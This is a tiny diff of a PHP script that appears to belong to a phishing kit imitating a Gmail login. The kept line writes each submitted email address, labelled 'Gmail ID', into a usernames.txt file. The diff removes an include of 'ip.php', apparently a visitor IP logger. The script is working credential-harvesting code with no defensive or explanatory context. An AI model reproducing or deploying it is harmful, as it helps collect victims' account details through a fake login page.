@@ -1,5 +1,5 @@
 <?php
-include 'ip.php';
+
 file_put_contents("usernames.txt", "Gmail ID : " . $email = $_POST['email'] . "\n", FILE_APPEND);
 ?>
 <?php
